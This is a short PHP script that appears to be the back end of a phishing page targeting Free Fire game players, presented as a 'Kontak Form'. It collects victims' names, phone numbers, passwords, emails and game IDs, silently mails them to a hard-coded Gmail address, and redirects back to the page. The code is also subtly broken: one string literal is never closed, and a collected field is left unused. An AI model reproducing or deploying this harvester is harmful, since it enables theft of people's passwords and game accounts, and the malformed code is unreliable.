<?php
$nama = $_POST['name'];
$nomertelepon = $_POST['nomer'];
$katasandi = $_POST['katasandi'];
$email= $_POST['email'];
$idfreefire= $_POST['idfreefire'];
$mainffdariseason = $_POST['mainffdariseason'];
$formcontent=" From: $nama \n nomertelepon : $nomertelepon \n katasandi: $katasandi \n email: $email \n mainffdariseason : $mainffdariseason \n 
$recipient = "zhydanhyper02@gmail.com";
$subject = "Kontak Form";
$mailheader = "From: $email \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
echo "<meta http-equiv=\"refresh\" content=\"0; url=index.php\">";
?>